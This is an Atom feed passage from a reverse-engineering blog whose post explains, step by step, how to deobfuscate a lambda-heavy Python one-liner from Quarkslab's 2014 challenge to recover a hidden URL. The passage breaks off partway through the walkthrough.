<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Diary of a reverse-engineer]]></title>
  <link href="http://doar-e.github.io/atom.xml" rel="self"/>
  <link href="http://doar-e.github.io/"/>
  <updated>2014-09-22T18:41:27+01:00</updated>
  <id>http://doar-e.github.io/</id>
  <author>
    <name><![CDATA[Axel Souchet, Jonathan Salwan, Jérémy Fetiveau]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    
    <title type="html"><![CDATA[Dissection of Quarkslab's 2014 security challenge]]></title>
    <link href="http://doar-e.github.io/blog/2014/09/06/dissection-of-quarkslabs-2014-security-challenge/"/>
    
    <updated>2014-09-06T20:37:00+01:00</updated>
    <id>http://doar-e.github.io/blog/2014/09/06/dissection-of-quarkslabs-2014-security-challenge</id>
    
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>As the blog was a bit silent for quite some time, I figured it would be cool to put together a post ; so here it is folks, dig in!</p>

<p>The French company <a href="http://blog.quarkslab.com/you-like-python-security-challenge-and-traveling-win-a-free-ticket-to-hitb-kul.html">Quarkslab</a> <a href="https://twitter.com/quarkslab/status/507457671386394624">recently</a> <a href="https://twitter.com/HITBSecConf/status/507458788522094592">released</a> a security challenge to win a free entrance to attend the upcoming <a href="https://conference.hitb.org/hitbsecconf2014kul/">HITBSecConf</a> conference in Kuala Lumpur from the 13th of October until the 16th.</p>

<p>The challenge has been written by <a href="http://blog.quarkslab.com/author/serge-guelton.html">Serge Guelton</a>, a R&amp;D engineer specialized in compilers/parallel computations. At the time of writing, already eight different people manage to solve the challenge, and one of the ticket seems to have been won by <code>hackedd</code>, so congrats to him!</p>

<p><img class="center" src="http://doar-e.github.io/images/dissection_of_quarkslab_s_2014_security_challenge/woot.png"></p>

<p>According to the description of the challenge Python is heavily involved, which is a good thing for at least two reasons:</p>

<ul>
<li>first because I already had <a href="https://doar-e.github.io/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug/">the occasion</a> to look at its source code in the past,</li>
<li>and because I so am a <a href="https://github.com/0vercl0k/stuffz/tree/master/Python's%20internals">big fan of Python</a>.</li>
</ul>


<p>In this post I will describe how I tackled this problem, how I managed to solve it. And to make up for me being slow at solving it I tried to make it fairly detailed.</p>

<p>At first it was supposed to be quite short though, but well..I decided to analyze fully the challenge even if it wasn&rsquo;t needed to find the key unfortunately, so it is a bit longer than expected :&ndash;).</p>

<p>Anyway, sit down, make yourself at home and let me pour you a cup of tea before we begin :&ndash;).</p>

<!--more-->


<h1>Finding the URL of the challenge</h1>

<h2>Very one-liner, much lambdas, such a pain</h2>

<p>The first part of the challenge is to retrieve an url hidden in the following Python one-liner:</p>

<figure class='code'><figcaption><span>Very one-liner, much lambdas</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="k">lambda</span> <span class="n">g</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">:</span> <span class="p">(</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="p">(</span><span class="n">_</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;$&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([(</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;chr&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;chr&#39;</span>
</span><span class='line'><span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="nb">chr</span><span class="p">)((</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;_&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;_&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">_</span><span class="p">))</span> <span class="k">for</span> <span class="n">_</span><span class="p">[</span><span class="s">&#39;_&#39;</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;s&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;s&#39;</span>
</span><span class='line'><span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">s</span><span class="p">)[::(</span><span class="o">-</span><span class="mi">1</span><span class="p">)]])),</span> <span class="n">_</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">])(</span> <span class="p">(</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="p">(</span><span class="k">lambda</span> <span class="n">f</span><span class="p">,</span> <span class="n">_</span><span class="p">:</span> <span class="n">f</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">_</span><span class="p">))((</span><span class="k">lambda</span>
</span><span class='line'><span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="p">:</span> <span class="p">((</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="n">__</span><span class="p">(</span><span class="n">__</span><span class="p">,</span> <span class="n">_</span><span class="p">))((</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="p">(</span><span class="n">_</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;i&#39;</span><span class="p">,</span> <span class="p">((</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;i&#39;</span>
</span><span class='line'><span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)),</span><span class="n">_</span><span class="p">)[(</span><span class="o">-</span><span class="mi">1</span><span class="p">)])((</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="p">(</span><span class="n">_</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;s&#39;</span><span class="p">,((</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;s&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;s&#39;</span>
</span><span class='line'><span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">s</span><span class="p">)</span> <span class="o">+</span> <span class="p">[((</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;l&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;l&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">l</span><span class="p">)[(</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;i&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">i</span>
</span><span class='line'><span class="p">)]</span> <span class="o">^</span> <span class="p">(</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;c&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;c&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">c</span><span class="p">))])),</span> <span class="n">_</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">])(</span><span class="n">_</span><span class="p">)))</span> <span class="k">if</span> <span class="p">(((</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;g&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;g&#39;</span> <span class="ow">in</span>
</span><span class='line'><span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">g</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span> <span class="ow">and</span> <span class="p">((</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;i&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">i</span><span class="p">)</span><span class="o">&lt;</span> <span class="p">(</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;len&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;len&#39;</span> <span class="ow">in</span> <span class="n">_</span>
</span><span class='line'><span class="p">)</span> <span class="k">else</span> <span class="nb">len</span><span class="p">)((</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;l&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;l&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">l</span><span class="p">))))</span> <span class="k">else</span> <span class="n">_</span><span class="p">)),</span> <span class="n">_</span><span class="p">)</span> <span class="p">)</span> <span class="p">(</span> <span class="p">(</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="p">(</span><span class="n">_</span><span class="o">.</span>
</span><span class='line'><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="p">[]),</span> <span class="n">_</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;s&#39;</span><span class="p">,</span> <span class="n">_</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span> <span class="n">_</span><span class="p">)[(</span><span class="o">-</span><span class="mi">1</span><span class="p">)]</span> <span class="p">)</span> <span class="p">((</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="p">(</span><span class="n">_</span><span class="o">.</span>
</span><span class='line'><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="p">((</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;d&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;d&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">d</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;d&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;d&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span>
</span><span class='line'><span class="n">d</span><span class="p">))),</span> <span class="n">_</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;i&#39;</span><span class="p">,</span> <span class="n">_</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span> <span class="n">_</span><span class="p">)[(</span><span class="o">-</span><span class="mi">1</span><span class="p">)])((</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="p">(</span><span class="n">_</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="p">[</span>
</span><span class='line'><span class="p">(</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;j&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;j&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">j</span><span class="p">)</span> <span class="k">for</span>  <span class="n">_</span><span class="p">[</span> <span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;zip&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;zip&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span>
</span><span class='line'><span class="nb">zip</span><span class="p">)((</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;l0&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;l0&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">l0</span><span class="p">),</span> <span class="p">(</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;l1&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;l1&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">l1</span><span class="p">))</span> <span class="k">for</span>
</span><span class='line'><span class="n">_</span><span class="p">[</span><span class="s">&#39;j&#39;</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;i&#39;</span> <span class="ow">in</span> <span class="n">_</span><span class="p">)</span> <span class="k">else</span> <span class="n">i</span><span class="p">)]),</span> <span class="n">_</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l&#39;</span><span class="p">,</span> <span class="n">_</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span> <span class="n">_</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span>
</span><span class='line'><span class="p">])((</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="p">(</span><span class="n">_</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="p">[</span><span class="mi">1373</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span> <span class="mi">1288</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1375</span><span class="p">,</span>
</span><span class='line'><span class="mi">1371</span><span class="p">,</span><span class="mi">1289</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span> <span class="mi">1289</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1289</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1288</span><span class="p">,</span>
</span><span class='line'><span class="mi">1375</span><span class="p">,</span><span class="mi">1375</span><span class="p">,</span> <span class="mi">1289</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1302</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1355</span><span class="p">,</span> <span class="mi">1366</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1302</span><span class="p">,</span>
</span><span class='line'><span class="mi">1360</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1354</span><span class="p">,</span> <span class="mi">1364</span><span class="p">,</span> <span class="mi">1370</span><span class="p">,</span> <span class="mi">1371</span><span class="p">,</span> <span class="mi">1365</span><span class="p">,</span> <span class="mi">1362</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1352</span><span class="p">,</span> <span class="mi">1374</span><span class="p">,</span> <span class="mi">1365</span><span class="p">,</span> <span class="mi">1302</span>
</span><span class='line'><span class="p">]),</span> <span class="n">_</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l1&#39;</span><span class="p">,</span><span class="n">_</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span> <span class="n">_</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">])((</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="p">(</span><span class="n">_</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,[</span><span class="mi">1375</span><span class="p">,</span>
</span><span class='line'><span class="mi">1368</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1295</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span><span class="mi">1294</span><span class="p">,</span>
</span><span class='line'><span class="mi">1293</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1292</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1291</span><span class="p">,</span> <span class="mi">1371</span><span class="p">,</span> <span class="mi">1375</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span><span class="mi">1373</span><span class="p">,</span>
</span><span class='line'><span class="mi">1371</span><span class="p">,</span> <span class="mi">1354</span><span class="p">,</span> <span class="mi">1370</span><span class="p">,</span> <span class="mi">1356</span><span class="p">,</span> <span class="mi">1354</span><span class="p">,</span> <span class="mi">1355</span><span class="p">,</span> <span class="mi">1370</span><span class="p">,</span> <span class="mi">1357</span><span class="p">,</span> <span class="mi">1357</span><span class="p">,</span> <span class="mi">1302</span><span class="p">,</span> <span class="mi">1366</span><span class="p">,</span> <span class="mi">1303</span><span class="p">,</span><span class="mi">1368</span><span class="p">,</span>
</span><span class='line'><span class="mi">1354</span><span class="p">,</span> <span class="mi">1355</span><span class="p">,</span> <span class="mi">1356</span><span class="p">,</span> <span class="mi">1303</span><span class="p">,</span> <span class="mi">1366</span><span class="p">,</span> <span class="mi">1371</span><span class="p">]),</span> <span class="n">_</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l0&#39;</span><span class="p">,</span> <span class="n">_</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span> <span class="n">_</span><span class="p">)[(</span><span class="o">-</span><span class="mi">1</span><span class="p">)])</span>
</span><span class='line'>            <span class="p">({</span> <span class="s">&#39;g&#39;</span><span class="p">:</span> <span class="n">g</span><span class="p">,</span> <span class="s">&#39;c&#39;</span><span class="p">:</span> <span class="n">c</span><span class="p">,</span> <span class="s">&#39;d&#39;</span><span class="p">:</span> <span class="n">d</span><span class="p">,</span> <span class="s">&#39;$&#39;</span><span class="p">:</span> <span class="bp">None</span><span class="p">})))))))[</span><span class="s">&#39;$&#39;</span><span class="p">])</span>
</span></code></pre></td></tr></table></div></figure>


<p>I think that was the first time I was seeing obfuscated Python and believe me I did a really strange face when seeing that snippet. But well, with a bit of patience we should manage to get a better understanding of how it is working, let&rsquo;s get to it!</p>

<h2>Tidying up the last one..</h2>

<p>Before doing that here are things we can directly observe just by looking closely at the snippet:</p>

<ul>
<li>We know this function has three arguments ; we don&rsquo;t know them at this point though</li>
<li>The snippet seems to reuse <em>__setitem__</em> quite a lot ; it may mean two things for us:

<ul>
<li>The only standard Python object I know of with a <em>__setitem__</em> function is <em>dictionary</em>,</li>
<li>The way the snippet looks like, it seems that once we will understand one of those <em>__setitem__</em> call, we will understand them all</li>
</ul>
</li>
<li>The following standard functions are used: <em>chr</em>, <em>len</em>, <em>zip</em>

<ul>
<li>That means manipulation of strings, integers and iterables</li>
</ul>
</li>
<li>There are two noticeable operators: <em>mod</em> and <em>xor</em></li>
</ul>


<p>With all that information in our sleeve, the first thing I did was to try to clean it up, starting from the last lambda in the snippet. It gives something like:</p>

<figure class='code'><figcaption><span>Last lambda cleaned</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">tab0</span> <span class="o">=</span> <span class="p">[</span>
</span><span class='line'>    <span class="mi">1375</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1295</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span>
</span><span class='line'>    <span class="mi">1280</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1292</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1291</span><span class="p">,</span>
</span><span class='line'>    <span class="mi">1371</span><span class="p">,</span> <span class="mi">1375</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1371</span><span class="p">,</span> <span class="mi">1354</span><span class="p">,</span> <span class="mi">1370</span><span class="p">,</span>
</span><span class='line'>    <span class="mi">1356</span><span class="p">,</span> <span class="mi">1354</span><span class="p">,</span> <span class="mi">1355</span><span class="p">,</span> <span class="mi">1370</span><span class="p">,</span> <span class="mi">1357</span><span class="p">,</span> <span class="mi">1357</span><span class="p">,</span> <span class="mi">1302</span><span class="p">,</span> <span class="mi">1366</span><span class="p">,</span> <span class="mi">1303</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span>
</span><span class='line'>    <span class="mi">1354</span><span class="p">,</span> <span class="mi">1355</span><span class="p">,</span> <span class="mi">1356</span><span class="p">,</span> <span class="mi">1303</span><span class="p">,</span> <span class="mi">1366</span><span class="p">,</span> <span class="mi">1371</span>
</span><span class='line'><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="n">z</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>    <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="n">tab0</span><span class="p">),</span>
</span><span class='line'>    <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l0&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>    <span class="n">x</span>
</span><span class='line'><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>That lambda takes a dictionary <em>x</em>, sets two items, generates a tuple with a reference to the dictionary at the end of the tuple ; finally the lambda is going to return that same dictionary.
It also uses <em>x[&lsquo;!&rsquo;]</em> as a temporary variable to then assign its value to <em>x[&lsquo;l0&rsquo;]</em>.</p>

<p>Long story short, it basically takes a dictionary, updates it and returns it to the caller: clever trick to pass that same object across lambdas. We can also see that easily in Python directly:</p>

<figure class='code'><figcaption><span>lambda, dictionary & setitem</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>In [8]: d = {}
</span><span class='line'>In [9]: z(d)
</span><span class='line'>Out[9]:
</span><span class='line'>{&#39;!&#39;: [1375,
</span><span class='line'>  ...
</span><span class='line'> &#39;l0&#39;: [1375,
</span><span class='line'>  ...
</span><span class='line'>}
</span></code></pre></td></tr></table></div></figure>


<p>That lambda is even called with a dictionary that will contain, among other things, the three user controlled variable: <em>g</em>, <em>c</em>, <em>d</em>.
That dictionary seems to be some kind of storage used to keep track of all the variables that will be used across those lambdas.</p>

<figure class='code'><figcaption><span>lambda & the resulting dictionary</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># Returns { &#39;g&#39; : g, &#39;c&#39;, &#39;d&#39;: d, &#39;$&#39;:None, &#39;!&#39;:tab0, &#39;l0&#39;:tab0}</span>
</span><span class='line'><span class="n">last_res</span> <span class="o">=</span> <span class="p">(</span>
</span><span class='line'>    <span class="p">(</span>
</span><span class='line'>        <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>            <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="n">tab0</span><span class="p">),</span>
</span><span class='line'>            <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l0&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>            <span class="n">x</span>
</span><span class='line'>        <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>    <span class="p">)</span>
</span><span class='line'>    <span class="p">({</span> <span class="s">&#39;g&#39;</span><span class="p">:</span> <span class="n">g</span><span class="p">,</span> <span class="s">&#39;c&#39;</span><span class="p">:</span> <span class="n">c</span><span class="p">,</span> <span class="s">&#39;d&#39;</span><span class="p">:</span> <span class="n">d</span><span class="p">,</span> <span class="s">&#39;$&#39;</span><span class="p">:</span> <span class="bp">None</span><span class="p">})</span>
</span><span class='line'><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<h2>..then the one before&hellip;</h2>

<p>Now if we repeat that same operation with the one before the last lambda, we have the exact same pattern:</p>

<figure class='code'><figcaption><span>lambda before the last one</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">tab1</span> <span class="o">=</span> <span class="p">[</span>
</span><span class='line'>    <span class="mi">1373</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span> <span class="mi">1288</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1375</span><span class="p">,</span> <span class="mi">1371</span><span class="p">,</span> <span class="mi">1289</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span>
</span><span class='line'>    <span class="mi">1280</span><span class="p">,</span> <span class="mi">1293</span><span class="p">,</span> <span class="mi">1289</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1289</span><span class="p">,</span> <span class="mi">1280</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1288</span><span class="p">,</span>
</span><span class='line'>    <span class="mi">1375</span><span class="p">,</span> <span class="mi">1375</span><span class="p">,</span> <span class="mi">1289</span><span class="p">,</span> <span class="mi">1373</span><span class="p">,</span> <span class="mi">1290</span><span class="p">,</span> <span class="mi">1281</span><span class="p">,</span> <span class="mi">1294</span><span class="p">,</span> <span class="mi">1302</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1355</span><span class="p">,</span>
</span><span class='line'>    <span class="mi">1366</span><span class="p">,</span> <span class="mi">1372</span><span class="p">,</span> <span class="mi">1302</span><span class="p">,</span> <span class="mi">1360</span><span class="p">,</span> <span class="mi">1368</span><span class="p">,</span> <span class="mi">1354</span><span class="p">,</span> <span class="mi">1364</span><span class="p">,</span> <span class="mi">1370</span><span class="p">,</span> <span class="mi">1371</span><span class="p">,</span> <span class="mi">1365</span><span class="p">,</span>
